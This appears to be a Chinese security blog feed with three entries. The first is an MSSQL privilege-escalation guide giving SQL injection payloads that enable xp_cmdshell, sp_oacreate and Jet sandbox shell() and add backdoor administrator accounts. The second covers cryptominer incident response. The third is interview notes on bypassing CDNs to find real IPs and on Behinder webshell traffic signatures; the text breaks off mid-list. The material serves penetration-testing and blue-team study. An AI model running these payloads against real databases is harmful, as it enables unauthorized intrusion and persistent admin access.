title="Mssql常用命令"></a>Mssql常用命令</h3><pre><code>#查看数据库版本select @@version #查看数据库系统参数 exec master..xp_msver; #查看用户所属角色信息 sp_help srvrolemember #查看当前数据库 select db_name(); #查看当前账户权限 select IS_SRVROLEMEMBER(&#39;sysadmin&#39;) #判断是否为sa权限 select IS_MEMBER(&#39;db_owner&#39;) #判断是否为dba权限 ，实际上只要是sa权限，必定有dba权限#禁用advanced options EXEC sp_configure &#39;show advanced options&#39;,0;GO RECONFIGURE;设为0，即禁用</code></pre><h2 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h2><p>xp_cmdshell扩展存储过程（也可以说是一个组件），可以让系统管理员以操作系统命令行解释器的方式执行给定的命令字符串，并以文本行方式返回任何输出。<br>由于xp_cmdshell 可以执行任何操作系统命令，所以一旦SQL Server管理员帐号（如sa）被攻破，那么攻击者就可以利用xp_cmdshell 在SQL Server中执行操作系统命令</p><h3 id="利用语法："><a href="#利用语法：" class="headerlink" title="利用语法："></a>利用语法：</h3><pre><code>exec master..xp_cmdshell &quot;dos命令&quot;如果可以利用，我们就可以利用这种方式执行powershell脚本，上线cs</code></pre><p>SQL Server 2000中默认是开启的<br>SQL Server 2005及以上版本中xp_cmdshell 默认是关闭的。<br>如果服务未开启，执行 xp_cmdshell 将会提示类似以下的内容：</p><pre><code>消息 15281，级别 16，状态 1，过程 xp_cmdshell，第 1 行</code></pre><p>SQL Server 阻止了对组件 ‘xp_cmdshell’ 的 过程‘sys.xp_cmdshell’ 的访问，因为此组件已作为此服务器安全配置的一部分而被关闭。</p><p>系统管理员可以通过使用 sp_configure 启用 ‘xp_cmdshell’。</p><pre><code>exec sp_configure &#39;show advanced options&#39;,1;reconfigure; #开启权限exec sp_configure &#39;xp_cmdshell&#39;,1;reconfigure;#开启组件即将默认0改为1，即修改了权限</code></pre><h3 id="利用步骤："><a href="#利用步骤：" class="headerlink" title="利用步骤："></a>利用步骤：</h3><ol><li>判断用户权限</li></ol><p>只有sysadmin组的用户才能执行xp_cmdshell</p><pre><code>and (select IS_SRVROLEMEMBER (&#39;sysadmin&#39;))=1-- </code></pre><ol><li>判断数据库中是否存在xp_cmdshell组件</li></ol><!----><pre><code>and 1=(select count(*) from master.dbo.sysobjects where xtype = &#39;x&#39; and name = &#39;xp_cmdshell&#39;) </code></pre><ol><li>尝试通过xp_cmdshell执行命令，检测xp_cmdshell组件是否启用</li></ol><!----><pre><code>;exec master..xp_cmdshell “net user name password /add“ –</code></pre><ol><li>启用xp_cmdshell（类似用；进行堆叠注入）</li></ol><!----><pre><code>;exec sp_configure &#39;show advanced options&#39;,1;reconfigure;exec sp_configure &#39;xp_cmdshell&#39;,1;reconfigure;-- </code></pre><ol><li>验证是否添加成功</li></ol><!----><pre><code>;exec master..xp_cmdshell &quot;ver&quot;-- </code></pre><ol><li>添加用户</li></ol><!----><pre><code>;exec master..xp_cmdshell &quot;net user alvin password /add&quot; --  </code></pre><ol><li>添加用户到管理员组</li></ol><!----><pre><code>;exec master..xp_cmdshell &quot;net localgroup administrators alvin /add&quot;--</code></pre><p>接下来就可以远程桌面登录！</p><h3 id="特殊情况："><a href="#特殊情况：" class="headerlink" title="特殊情况："></a>特殊情况：</h3><h4 id="无回显情况："><a href="#无回显情况：" class="headerlink" title="无回显情况："></a>无回显情况：</h4><p>通过调用系统命令，访问外部浏览器，如果成功表示开启成功，如何进行外带注入即可！！</p><h2 id="xp-cmdshell被删除禁用或出错"><a href="#xp-cmdshell被删除禁用或出错" class="headerlink" title="xp_cmdshell被删除禁用或出错"></a>xp_cmdshell被删除禁用或出错</h2><p>可以充分利用<strong>SP_OACreate</strong>进行提权：</p><ol><li>打开组件：</li></ol><!----><pre><code>exec sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE; exec sp_configure &#39;Ole Automation Procedures&#39; , 1;RECONFIGURE;</code></pre><ol><li>添加用户及移动到管理员组</li></ol><!----><pre><code>declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\windows\system32\cmd.exe /c net user zhangsan 123456 /add&#39; declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\windows\system32\cmd.exe /c net localgroup administrators zhangsan /add&#39;</code></pre><ol><li>执行命令：</li></ol><!----><pre><code>declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\windows\system32\cmd.exe /c whoami &gt;c:\programdata\1.txt&#39; --</code></pre><h2 id="沙盒模式（不太常用）"><a href="#沙盒模式（不太常用）" class="headerlink" title="沙盒模式（不太常用）"></a>沙盒模式（不太常用）</h2><p>沙盒模式是数据库的一种安全功能.在沙盒模式下,只对控件和字段属性中的安全且不含恶意代码的表达式求值.</p><p>如果表达式不使用可能以某种方式损坏数据的函数或属性，则可认为它是安全的</p><ul><li>无法执行命令时，xp_regwrite可用</li><li>Access执行这个命令是有条件的，需要一个开关被打开</li></ul><p>#首先检查xp_cmdshell是否开启</p><pre><code>select count(*) from master.dbo.sysobjects where xtyoe=&#39;x&#39; and name=&#39;xp_cmdshell&#39; </code></pre><p>#开启沙盒模式</p><pre><code>exec master..xp_regwrite &#39;HKEY_LOCAL_MACHINE&#39;,&#39;SOFTWARE\Microsoft\Jet\4.0\Engines&#39;,&#39;SandBoxMode&#39;,&#39;REG_DWORD&#39;,0 </code></pre><p>SandBoxMode参数含义（默认是2）<br>0：在任何所有者中禁止启用安全模式<br>1 ：为仅在允许范围内<br>2 ：必须在access模式下<br>3：完全开启<br>#添加用户</p><pre><code>select * from openrowset(&#39;microsoft.jet.oledb.4.0&#39; ,&#39;;database=c:\windows\system32\ias\ias.mdb&#39; ,&#39;select shell(&quot;cmd.exe /c net user zhangsan 121345 /add&quot;)&#39;) select * from openrowset(&#39;microsoft.jet.oledb.4.0&#39; ,&#39;;database=c:\windows\system32\ias\ias.mdb&#39; ,&#39;select shell(&quot;cmd.exe /c net localgroup administrators zhangsan /add&quot;)&#39;) </code></pre><h6 id=""><a href="#" class="headerlink" title=""></a></h6>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 内网 </category>
          
          <category> 权限提升 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>挖矿病毒及应对措施</title>
      <link href="/2022-09-23-%E7%9F%A5%E8%AF%86/%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%8F%8A%E5%BA%94%E5%AF%B9%E6%8E%AA%E6%96%BD/"/>
      <url>/2022-09-23-%E7%9F%A5%E8%AF%86/%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%8F%8A%E5%BA%94%E5%AF%B9%E6%8E%AA%E6%96%BD/</url>
      
        <content type="html"><![CDATA[<h1 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h1><p>1.黑客通过挖矿程序窃取机密信息，比如机密文件、关键资产的用户名和密码等，导致资产遭受更进一步的资产损失。</p><p>2.黑客控制主机作为“肉鸡”攻击互联网上的其他单位，违反网络安全法。</p><p>3.黑客利用已经控制的机器，作为继续对业务系统区域渗透的跳板，产生更严重的网络安全攻击事件。</p><h1 id="原因排查"><a href="#原因排查" class="headerlink" title="原因排查"></a>原因排查</h1><p>一旦发现服务器被挖矿，应该首先查看挖矿进程所属的用户，根据挖矿进程的运行用户去排查该用户下是否还运行着其它进程，确定这些进程是否有上述经常被黑客利用的漏洞。如果有常见的漏洞，则应该重点对此进行排查找到原因</p><p>为什么会中挖矿病毒呢？</p><p>“挖矿病毒”一般因为疏于安全防护而感染:</p><p>■ 垃圾邮件：用户点击了钓鱼邮件并运行了含病毒的附件。</p><p>■ 软件捆绑：用户下载运行了非官方的破解软件。</p><p>■ 漏洞传播：用户的操作系统或软件存在漏洞，黑客利用漏洞植入挖矿病毒。</p><p>■ 网页挖矿：用户访问了来历不明的网页，该网页被植入挖矿脚本，浏览器会运行脚本进行挖矿。</p><h1 id="挖矿病毒判断"><a href="#挖矿病毒判断" class="headerlink" title="挖矿病毒判断"></a>挖矿病毒判断</h1><p>挖矿木马占用系统资源进行挖矿行为，一般电脑会有以下特征</p><ol><li>系统响应缓慢</li><li>CPU&#x2F;显卡使用率过高</li><li>内存&#x2F;带宽占用高</li></ol><h1 id="挖矿常用手段"><a href="#挖矿常用手段" class="headerlink" title="挖矿常用手段"></a>挖矿常用手段</h1><ol><li>未授权访问或弱口令：Redis 未授权访问、Docker API 未授权访问、Hadoop Yarn 未授权访问、NFS 未授权访问、Rsync 弱口令、PostgreSQL 弱口令、Tomcat 弱口令、SSH 弱口令、Telnet 弱口令、Windows 远程桌面弱口令</li><li>远程命令执行漏洞：WebLogic XML 反序列化漏洞、Jenkins 反序列化、Jboss 远程代码执行、Spring 远程代码执行、ElasticSearch 命令执行、永恒之蓝、Struts2 系列漏洞、常见 CMS 的远程命令执行漏洞</li><li>新爆的高危漏洞：一般每次爆发新的高危漏洞，都会紧跟一波大规模的全网扫描利用和挖矿</li></ol><h1 id="清除挖矿木马（入侵排查过程）"><a href="#清除挖矿木马（入侵排查过程）" class="headerlink" title="清除挖矿木马（入侵排查过程）"></a>清除挖矿木马（入侵排查过程）</h1><h2 id="及时隔离主机"><a href="#及时隔离主机" class="headerlink" title="及时隔离主机"></a>及时隔离主机</h2><p>部分带有蠕虫功能的挖矿木马在取得本机的控制权后，会以本机为跳板机，对同一局域网内的其他主机进行已知漏洞的扫描和进一步利用， 所以发现挖矿现象后，在不影响业务的前提下应该及时隔离受感染主机，然后进行下一步分析</p><h2 id="删除文件、阻断与矿池通讯"><a href="#删除文件、阻断与矿池通讯" class="headerlink" title="删除文件、阻断与矿池通讯"></a>删除文件、阻断与矿池通讯</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">执行以下命令查看挖矿进程的执行文件链接</span></span><br><span class="line">ls -l /proc/xxx/exe          # xxx表示该进程的PID。</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">执行以下命令查看是否存在业务范围之外的可疑通信地址和开放端口</span></span><br><span class="line">iptables -L -n</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">执行以下命令清除恶意矿池地址</span></span><br><span class="line">vi /etc/sysconfig/iptables</span><br></pre></td></tr></table></figure><h2 id="清除定时任务"><a href="#清除定时任务" class="headerlink" title="清除定时任务"></a>清除定时任务</h2><p>大部分挖矿进程会在受感染主机中写入定时任务来完成程序的驻留，当安全人员只清除挖矿木马时，定时任务会再次从服务器下载挖矿进程或者直接执行挖矿脚本，导致挖矿进程清除失败</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">crontab -l </span><br><span class="line">crontab -r</span><br></pre></td></tr></table></figure><h2 id="清除启动项"><a href="#清除启动项" class="headerlink" title="清除启动项"></a>清除启动项</h2><p>有的挖矿进程为了实现长期驻留，会向系统中添加启动项来确保系统重启后挖矿进程还能重新启动，所以在清除时还应该关注启动项中的内容如果有可疑的启动项，也应该进行排查，确认是挖矿进程后，对其进行清除</p><h2 id="kill-挖矿进程"><a href="#kill-挖矿进程" class="headerlink" title="kill 挖矿进程"></a>kill 挖矿进程</h2><p>对于单进程挖矿程序，直接结束挖矿进程即可。但是对于大多数的挖矿进程，如果挖矿进程有守护进程，应先杀死守护进程再杀死挖矿进程，避免清除不彻底 在实际的清除工作中，应找到本机上运行的挖矿脚本，根据脚本的执行流程确定木马的驻留方式， 并按照顺序进行清除， 避免清除不彻底</p><h2 id="清除公钥文件"><a href="#清除公钥文件" class="headerlink" title="清除公钥文件"></a>清除公钥文件</h2><p>在用户 home 目录的 .ssh 目录下放置 authoruzed_keys 文件，从而免密登录该机器也是一种常见的保持服务器控制权的手段。在排查过程中应该查看该文件中是否有可疑公钥信息，有的话直接删除，避免攻击者再次免密登录该主机</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat .ssh/authorized_keys</span><br></pre></td></tr></table></figure><h1 id="Windows系统清除木马"><a href="#Windows系统清除木马" class="headerlink" title="Windows系统清除木马"></a>Windows系统清除木马</h1><ol><li><p>通过CPU占用情况排查可疑的挖矿进程。</p></li><li><p>执行以下命令，查看挖矿进程的磁盘文件、进程启动命令的参数。</p></li></ol><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">wmic <span class="keyword">process</span> <span class="built_in">where</span> processid=xxx get processid,executablepath,commandline,name     <span class="comment">#xxx表进程pid</span></span><br></pre></td></tr></table></figure><ol start="3"><li><p>结束挖矿进程，清除挖矿文件。</p></li><li><p>执行以下命令，检查主机连接的可疑网络端口。</p></li></ol><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">netstat <span class="literal">-ano</span> | findstr xxx            <span class="comment"># xxx 表可疑的网络端口</span></span><br></pre></td></tr></table></figure><ol start="5"><li>执行以下命令，检查服务器中hosts文件是否存在挖矿程序的矿池地址。</li></ol><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">type</span>  C:\Windows\System32\drivers\etc\hosts</span><br></pre></td></tr></table></figure><ol start="6"><li>执行以下命令，排查是否存在挖矿程序设定的计划任务。</li></ol><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">schtasks /query</span><br></pre></td></tr></table></figure><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><ul><li><p><a href="https://zhuanlan.zhihu.com/p/139019250">如何应对挖矿病毒</a></p></li><li><p><a href=""><strong>一键清除！网御星云解锁挖矿病毒防护与处置“新技能”</strong></a></p></li><li><p>[**挖矿程序处理最佳实践**](<a href="https://help.aliyun.com/document_detail/161236.html#:~:text=%E9%9D%9E%E4%BA%91%E5%AE%89%E5%85%A8%E4%B8%AD%E5%BF%83%E7%94%A8%E6%88%B7%E5%A4%84%E7%90%86%E6%8C%96%E7%9F%BF%E7%A8%8B%E5%BA%8F%EF%BC%88Windows%E7%B3%BB%E7%BB%9F%EF%BC%89">https://help.aliyun.com/document_detail/161236.html#:~:text=非云安全中心用户处理挖矿程序（Windows系统）</a> 1 执行以下命令，通过CPU占用情况排查可疑的挖矿进程。… 2 执行以下命令，查看挖矿进程的磁盘文件、进程启动命令的参数。… 3 结束挖矿进程，清除挖矿文件。,4 执行以下命令，检查主机连接的可疑网络端口。… 5 执行以下命令，检查服务器中hosts文件是否存在挖矿程序的矿 … 6 执行以下命令，排查是否存在挖矿程序设定的计划任务。)</p></li><li><p><a href="https://github.com/Lorna-Dane/Blue-Team">一些个人学习的蓝队知识以及取证笔记</a></p></li><li><p><a href="https://github.com/Bypass007/Emergency-Response-Notes">应急响应实战笔记，一个安全工程师的自我修养</a></p></li><li><p><a href="https://bypass007.github.io/Emergency-Response-Notes/">应急响应实战笔记</a></p></li><li><p><a href="https://www.mubucm.com/doc/8aGBgK_MVg">Linux入侵排查</a></p></li><li><p><a href="https://www.mubucm.com/doc/GtiDRd0nVg">Windows入侵排查</a></p></li><li><p><a href="http://wlaq.xjtu.edu.cn/info/1008/1945.htm">挖矿病毒处置（Linux篇) ——从入门到放弃</a></p></li><li><p><a href="http://les1ie.com/2021/07/12/tor-miner/">又一起挖矿木马排查</a></p></li><li><p><a href="https://www.anquanke.com/post/id/92223">利用WebLogic漏洞挖矿事件分析</a></p></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>hw面试题</title>
      <link href="/2022-09-23-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E9%9D%A2%E8%AF%95+%E7%AC%94%E8%AF%95/hw%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
      <url>/2022-09-23-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E9%9D%A2%E8%AF%95+%E7%AC%94%E8%AF%95/hw%E9%9D%A2%E8%AF%95%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>护网或者重保面试题</p><h1 id="基础问题"><a href="#基础问题" class="headerlink" title="基础问题"></a>基础问题</h1><h3 id="如何判断一个网站（挂了CDN）的真实ip地址"><a href="#如何判断一个网站（挂了CDN）的真实ip地址" class="headerlink" title="如何判断一个网站（挂了CDN）的真实ip地址"></a>如何判断一个网站（挂了CDN）的真实ip地址</h3><blockquote><ul><li>多地ping（黑客也可以从多个地点ping他们想要确认的域名，若返回的是不同的ip，那么服务器确定使用了cdn，返回的ip也不是服务器的真实ip）</li><li>子域名查找（因为cdn和反向代理是需要成本的，有的网站只在比较常用的域名使用cdn或反向代理，有的时候一些测试子域名和新的子域名都没来得及加入cdn和反向代理，所以有时候是通过查找子域名来查找网站的真实IP）</li><li>IP历史记录查询法 （有的网站是后来才加入CDN的，所以只需查询它的解析历史即可获取真实ip</li><li>网站漏洞查找法 （通过网站的信息泄露如phpinfo泄露，github信息泄露，命令执行等漏洞获取真实ip）</li><li>网站订阅邮件法 (黑客可以通过网站订阅邮件的功能，让网站给自己发邮件，查看邮件的源代码即可获取网站真实ip)</li><li>Win下使用nslookup命令进行查询，若返回域名解析结果为多个ip，多半使用了CDN，是不真实的ip。</li></ul></blockquote><h3 id="如何绕过CDN呢"><a href="#如何绕过CDN呢" class="headerlink" title="如何绕过CDN呢"></a>如何绕过CDN呢</h3><p>有些攻击者喜欢用cdn 隐藏流量，我们可以使用一些网上的工具比如说 dnsinfo 啊，dnsdumpster 这些，</p><blockquote><ul><li><p>子域名查询：有的网站主域名会做CDN，但是子域名可能不会做。查询子域名的方法就很多了：subDomainsBrute、Sublist3r、Google hack等。</p></li><li><p>邮件服务查询：我们访问别人，可能通过CND，但别人访问我们通常不会走CDN</p></li><li><p>国外地址请求：国外没有cdn节点的话，可能直接走原ip</p></li><li><p>遗留文件，扫描全网</p></li><li><p>黑暗引擎搜索特定文件，fofa，钟馗之眼</p></li><li><p>以量打量：CDN节点是有流量上限的，用光之后就会直通原机，这也是一种流量攻击</p></li><li><p>历史DNS记录:  查询ip与域名绑定历史记录，可能会发现使用CDN之前的目标ip。查询网站有：</p></li></ul><blockquote><ul><li><a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a></li><li><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></li><li><a href="http://toolbar.netcraft.com/site_report?url=">http://toolbar.netcraft.com/site_report?url=</a></li><li><a href="http://viewdns.info/">http://viewdns.info/</a></li><li><a href="http://www.17ce.com/">http://www.17ce.com/</a></li><li><a href="https://community.riskiq.com/">https://community.riskiq.com/</a></li><li><a href="http://www.crimeflare.com/cfssl.html">http://www.crimeflare.com/cfssl.html</a></li></ul></blockquote><ul><li>利用网站漏洞</li></ul><p>如果目标站点存在漏洞，这就没办法避免了。例如phpinfo敏感信息泄露、Apache status和Jboss status敏感信息泄露、网页源代码泄露、svn信息泄露信、github信息泄露等。</p><p>若存在web漏洞，服务器主动与我们发起请求连接，我们也能获取目标站点真实ip。例如xss、ssrf、命令执行反弹shell等</p><ul><li>也可以根据 XFF 头，referer 头来判断</li><li>抓取图标icon的hash，然后在网络空间搜索引擎中去search</li></ul><blockquote><p><a href="https://blog.csdn.net/Aaron_Miller/article/details/117532626">如果访问有 icon 的话，可以抓hash 去匹配</a>。shodan，x 情报社区，钟馗之眼，fofa，夸克，google 语法这些就可以用一用了。</p></blockquote><blockquote><p><a href="https://fofa.so/">网络空间测绘搜索引擎FOFA</a> 和 <a href="https://www.shodan.io/">物联网暗黑搜索引擎Shodan</a>可以通过网站的icon计算出一个用来搜索目标的<a href="https://so.csdn.net/so/search?q=hash&spm=1001.2101.3001.7020">hash</a>值：iconhash，信息收集过程中我们也可以通过iconhash去反差使用此icon的所有站点。</p></blockquote><ul><li>Zmap大法</li></ul><blockquote><p>据说扫描全网，只要44分钟？</p><p>可参考这篇文章：<a href="https://link.zhihu.com/?target=http://bobao.360.cn/learning/detail/211.html">简单获取CDN背后网站的真实IP - 安全客 - 有思想的安全新媒体</a></p></blockquote><ul><li>网络空间引擎搜索法</li></ul><blockquote><p>zoomeye、fofa、shodan</p><p>通过这些公开的安全搜索引擎爬取得历史快照，主要得一些特征总结如下：</p><p>特有的http头部（如server类型、版本、cookie等信息)、</p><p>特定keyword（如title、css、js、url等）、</p><p>特定的IP段搜索（如fofa支持C段搜索），</p><p>有些时候爬取的时候不一定含有上面那些特征，但是我们仍然需要仔细排查。</p></blockquote><ul><li>查询Https证书</li></ul></blockquote><h3 id="如何⼿⼯快速判断⽬标站是-windows-还是-linux-服务器？"><a href="#如何⼿⼯快速判断⽬标站是-windows-还是-linux-服务器？" class="headerlink" title="如何⼿⼯快速判断⽬标站是   windows   还是   linux   服务器？"></a>如何⼿⼯快速判断⽬标站是   windows   还是   linux   服务器？</h3><blockquote><p>1、linux大小写敏感,windows大小写不敏感。—–已经测试证实</p><p>2、ping服务器，返还得TTL值不一样，windows一般在100以上，linux一般是100一下。—已经测试证实通过测试</p><blockquote><p>ping linux内网机器的ttl为64</p><p>ping window内网机器的ttl为126</p></blockquote><p>3、推理及应用，测试百度的机器是linux还是windows的</p></blockquote><h3 id="你知道红队经常用于攻击的漏洞是什么吗？"><a href="#你知道红队经常用于攻击的漏洞是什么吗？" class="headerlink" title="你知道红队经常用于攻击的漏洞是什么吗？"></a>你知道红队经常用于攻击的漏洞是什么吗？</h3><blockquote><ul><li>shiro-550 漏洞，由于 shiro 框架中用于加密 cookie 的密钥是硬编码的，攻击者可以伪造合法 cookie 传入服务器后端，进而造成 java 反序列化漏洞</li><li>fastjson 反序列化漏洞，fastjson 在解析 json 的过程中，支持使用autoType 来实例化某一个具体的类，并调用该类的 set&#x2F;get 方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。进而造成 rce</li><li>弱口令漏洞</li><li>struts2 漏洞</li><li>thinkphp 框架漏洞</li><li>log4j2</li></ul></blockquote><h3 id="介绍⼀下⾃认为有趣的挖洞经历"><a href="#介绍⼀下⾃认为有趣的挖洞经历" class="headerlink" title="介绍⼀下⾃认为有趣的挖洞经历"></a>介绍⼀下⾃认为有趣的挖洞经历</h3><blockquote></blockquote><h3 id="你平时⽤的⽐较多的漏洞是哪些？相关漏洞的原理？以及对应漏洞的修复⽅案？"><a href="#你平时⽤的⽐较多的漏洞是哪些？相关漏洞的原理？以及对应漏洞的修复⽅案？" class="headerlink" title="你平时⽤的⽐较多的漏洞是哪些？相关漏洞的原理？以及对应漏洞的修复⽅案？"></a>你平时⽤的⽐较多的漏洞是哪些？相关漏洞的原理？以及对应漏洞的修复⽅案？</h3><blockquote></blockquote><h1 id="流量特征"><a href="#流量特征" class="headerlink" title="流量特征"></a>流量特征</h1><h2 id="冰蝎流量特征"><a href="#冰蝎流量特征" class="headerlink" title="冰蝎流量特征"></a>冰蝎流量特征</h2><blockquote><ul><li><a href="https://zhuanlan.zhihu.com/p/135227454#:~:text=%E7%94%B1%E4%BA%8E%E9%80%9A%E4%BF%A1%E6%B5%81%E9%87%8F%E8%A2%AB%E5%8A%A0%E5%AF%86%EF%BC%8C%E4%BC%A0%E7%BB%9F%E7%9A%84%20WAF%E3%80%81IDS,%E8%AE%BE%E5%A4%87%E9%9A%BE%E4%BB%A5%E6%A3%80%E6%B5%8B%EF%BC%8C%E7%BB%99%E5%A8%81%E8%83%81%E7%8B%A9%E7%8C%8E%E5%B8%A6%E6%9D%A5%E8%BE%83%E5%A4%A7%E6%8C%91%E6%88%98%E3%80%82%20%E5%86%B0%E8%9D%8E%E5%85%B6%E6%9C%80%E5%A4%A7%E7%89%B9%E7%82%B9%E5%B0%B1%E6%98%AF%E5%AF%B9%E4%BA%A4%E4%BA%92%E6%B5%81%E9%87%8F%E8%BF%9B%E8%A1%8C%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%EF%BC%8C%E4%B8%94%E5%8A%A0%E5%AF%86%E7%A7%98%E9%92%A5%E6%98%AF%E7%94%B1%E9%9A%8F%E6%9C%BA%E6%95%B0%E5%87%BD%E6%95%B0%E5%8A%A8%E6%80%81%E7%94%9F%E6%88%90%EF%BC%8C%E5%9B%A0%E6%AD%A4%E8%AF%A5%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%9A%84%E6%B5%81%E9%87%8F%E5%87%A0%E4%B9%8E%E6%97%A0%E6%B3%95%E6%A3%80%E6%B5%8B%E3%80%82">冰蝎-特征检测及报文解密</a></li><li><a href="https://www.freebuf.com/articles/247009.html">冰蝎3.0流量特征分析（附特征）</a></li><li><a href="https://www.freebuf.com/articles/web/324622.html">常见webshell工具及特征分析</a></li></ul></blockquote><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>冰蝎特点：<strong>AES对称加密、</strong>动态二进制网站管理客户端，配合服务端 shell 的动态二进制加密通信，适用于 waf 拦截的回显。冰蝎其最大特点就是对交互流量进行对称加密，加密后还会进行 base64 编码。且加密秘钥是由随机数函数动态生成，因此该客户端的流量几乎无法检测</p><ul><li><p>冰蝎的通信过程可以分为两个阶段：</p><blockquote><ol><li>密钥协商</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209231500459.jpeg" alt="img" style="zoom:33%;" /><ol><li>加密传输</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209231501826.jpeg" alt="img" style="zoom:33%;" /></blockquote></li></ul><h3 id="流量特征："><a href="#流量特征：" class="headerlink" title="流量特征："></a>流量特征：</h3><ul><li><p>冰蝎在连接之前（也就是在密钥协商阶段）会发送一个GET请求，服务端如果正常会响应一个16位的字符串(密钥），小写字母+数字组成。密钥存在于Response Body中。</p></li><li><p>请求中content-length 请求长度，对于上传文件，命令执行来讲，加密的参数不定长。但是对于密钥交互，获取基本信息来讲，<strong>payload都为定长</strong>（这个不一定准确）。一般为5740或5720（可能会根据Java版本而改变）</p></li><li><p>每一个请求头中存在Pragma: no-cache，Cache-Control: no-cache</p></li><li><p>冰蝎3.0：一般冰蝎的流量包会伴随着大量的 <code>content-type:application/octet-stream</code></p></li></ul><blockquote><ul><li><strong>application&#x2F;octet-stream</strong>：</li></ul><p>只能提交二进制，而且只能提交一个二进制，如果提交文件的话，只能提交一个文件,后台接收参数只能有一个，而且只能是流（或者字节数组）；</p><p>属于HTTP规范中Content-Type的一种；</p><p>很少使用。</p></blockquote><ul><li>Accept字段(可被绕过)</li></ul><p>Accept是HTTP协议常用的字段，但冰蝎默认 Accept 字段的值却很特殊，这个特征存在于冰蝎的任何一个通讯阶段。如下：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Accept: text/html,image/gif, image/jpeg, *; q=.2, */*; q=.2</span><br><span class="line">3.0：</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209231502053.jpeg" alt="img" style="zoom:33%;" /><ul><li>UserAgent字段（可绕过）</li></ul><p>冰蝎3.0：默认内置十六个 ua 头。每次连接 shell 会随机选择一个进行使用。如果发现历史流量中同一个源IP访问某个URL时，命中了以下列表中多个 UserAgent ，可基本确认为冰蝎特征。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.163 Safari/535.1</span><br><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0) Gecko/20100101 Firefox/6.0</span><br><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50</span><br><span class="line">Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.9.168 Version/11.50</span><br><span class="line">Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; Tablet PC 2.0; .NET4.0E)</span><br><span class="line">Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; InfoPath.3)</span><br><span class="line">Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB7.0)</span><br><span class="line">Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)</span><br><span class="line">Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)</span><br><span class="line">Mozilla/5.0 (Windows; U; Windows NT 6.1; ) AppleWebKit/534.12 (KHTML, like Gecko) Maxthon/3.0 Safari/534.12</span><br><span class="line">Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E)</span><br><span class="line">Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E; SE 2.X MetaSr 1.0)</span><br><span class="line">Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) 